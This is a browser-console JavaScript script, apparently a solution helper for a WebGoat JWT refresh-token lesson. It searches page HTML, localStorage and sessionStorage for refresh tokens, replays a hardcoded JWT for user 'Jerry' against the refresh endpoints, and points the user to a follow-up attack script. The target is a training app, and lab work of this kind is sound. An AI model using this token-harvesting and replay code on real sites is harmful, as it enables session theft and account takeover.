// ═══════════════════════════════════════════════════════════
// PASTE THIS IN CONSOLE TO FIND YOUR REFRESH TOKEN
// ═══════════════════════════════════════════════════════════

(async function() {
    console.clear();
    console.log('%c🔍 SEARCHING FOR REFRESH TOKEN...', 'font-size: 18px; font-weight: bold; color: cyan');
    
    // Your current access token (Jerry)
    const JERRY_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0.eaksrYMTQa-r_dqWEQL5nTRmzozm6A2qSjgpyyzKjnOLmvHSL0PI9rg_TrsA0QNKGnyBxNJwAvEO_us-satI1w';
    
    console.log('\n%c[1] Checking Page HTML for refresh_token...', 'color: yellow; font-weight: bold');
    const html = document.documentElement.innerHTML;
    
    // Look for refresh_token in various formats
    const patterns = [
        /refresh_token["']?\s*:\s*["']([^"']+)/gi,
        /refreshToken["']?\s*:\s*["']([^"']+)/gi,
        /"refresh_token":\s*"([^"]+)"/gi,
        /refresh_token=([a-zA-Z0-9\-_]+)/gi
    ];
    
    let found = false;
    for (const pattern of patterns) {
        const matches = [...html.matchAll(pattern)];
        if (matches.length > 0) {
            console.log(`%c✓ Found ${matches.length} potential refresh token(s):`, 'color: green; font-weight: bold');
            matches.forEach((match, i) => {
                const token = match[1];
                console.log(`  [${i + 1}] ${token}`);
                window.myRefreshToken = token;
            });
            found = true;
            break;
        }
    }
    
    if (!found) {
        console.log('%c✗ Not found in HTML', 'color: orange');
    }
    
    console.log('\n%c[2] Checking localStorage...', 'color: yellow; font-weight: bold');
    let foundInStorage = false;
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        if (key.toLowerCase().includes('refresh') || key.toLowerCase().includes('token')) {
            console.log(`%c✓ localStorage.${key}:`, 'color: green');
            console.log(`  ${value}`);
            if (key.toLowerCase().includes('refresh')) {
                window.myRefreshToken = value;
            }
            foundInStorage = true;
        }
    }
    if (!foundInStorage) {
        console.log('%c✗ Nothing relevant in localStorage', 'color: orange');
    }
    
    console.log('\n%c[3] Checking sessionStorage...', 'color: yellow; font-weight: bold');
    foundInStorage = false;
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        if (key.toLowerCase().includes('refresh') || key.toLowerCase().includes('token')) {
            console.log(`%c✓ sessionStorage.${key}:`, 'color: green');
            console.log(`  ${value}`);
            if (key.toLowerCase().includes('refresh')) {
                window.myRefreshToken = value;
            }
            foundInStorage = true;
        }
    }
    if (!foundInStorage) {
        console.log('%c✗ Nothing relevant in sessionStorage', 'color: orange');
    }
    
    console.log('\n%c[4] Attempting to request refresh token from server...', 'color: yellow; font-weight: bold');
    
    // Try POST to newToken with empty body
    try {
        console.log('Trying: POST /WebGoat/JWT/refresh/newToken with your access token...');
        const resp1 = await fetch('/WebGoat/JWT/refresh/newToken', {
            method: 'POST',
            headers: {
                'Authorization': 'Bearer ' + JERRY_TOKEN,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({})
        });
        
        console.log(`Response: ${resp1.status} ${resp1.statusText}`);
        const data1 = await resp1.json();
        console.log('Data:', data1);
        
        if (data1.refresh_token) {
            console.log('%c✓ Got refresh_token from server!', 'color: green; font-weight: bold');
            console.log(`  ${data1.refresh_token}`);
            window.myRefreshToken = data1.refresh_token;
        }
        if (data1.access_token) {
            console.log('  Also got new access_token:', data1.access_token);
        }
    } catch (e) {
        console.log('%c✗ Request failed:', 'color: red', e.message);
    }
    
    // Try GET /refresh/login
    try {
        console.log('\nTrying: POST /WebGoat/JWT/refresh/login...');
        const resp2 = await fetch('/WebGoat/JWT/refresh/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({user: 'Jerry', password: 'anything'})
        });
        
        console.log(`Response: ${resp2.status} ${resp2.statusText}`);
        if (resp2.ok) {
            const data2 = await resp2.json();
            console.log('Data:', data2);
            
            if (data2.refresh_token) {
                console.log('%c✓ Got refresh_token!', 'color: green; font-weight: bold');
                console.log(`  ${data2.refresh_token}`);
                window.myRefreshToken = data2.refresh_token;
            }
        }
    } catch (e) {
        console.log('%c✗ Request failed:', 'color: red', e.message);
    }
    
    console.log('\n%c[5] Checking for buttons that might give tokens...', 'color: yellow; font-weight: bold');
    
    const buttons = document.querySelectorAll('button, input[type="button"], input[type="submit"]');
    console.log(`Found ${buttons.length} button(s) on page:`);
    buttons.forEach((btn, i) => {
        const text = btn.textContent || btn.value || btn.id || btn.className;
        console.log(`  [${i + 1}] ${text.substring(0, 50)}`);
    });
    
    console.log('\n%c═══════════════════════════════════════════════════', 'color: cyan');
    
    if (window.myRefreshToken) {
        console.log('%c✅ REFRESH TOKEN FOUND!', 'color: white; background: green; font-size: 16px; font-weight: bold; padding: 5px');
        console.log('Token:', window.myRefreshToken);
        console.log('\n%c🚀 Now run the attack script!', 'color: green; font-size: 14px; font-weight: bold');
        console.log('The refresh token has been saved to: window.myRefreshToken');
        console.log('\nPaste the attack script from JWT_REFRESH_EXACT_SOLUTION.txt (STEP 2)');
    } else {
        console.log('%c⚠️ REFRESH TOKEN NOT FOUND', 'color: orange; font-size: 16px; font-weight: bold');
        console.log('\n%c💡 TRY THESE:', 'color: cyan; font-weight: bold');
        console.log('1. Look at the lesson page - is there a "Login" or "Get Token" button?');
        console.log('2. Click that button and watch Network tab (F12)');
        console.log('3. Look for a response containing refresh_token');
        console.log('4. Then manually set: window.myRefreshToken = "your_token_here"');
        console.log('5. Then run the attack script');
    }
    
    console.log('\n%c═══════════════════════════════════════════════════', 'color: cyan');
    
})();
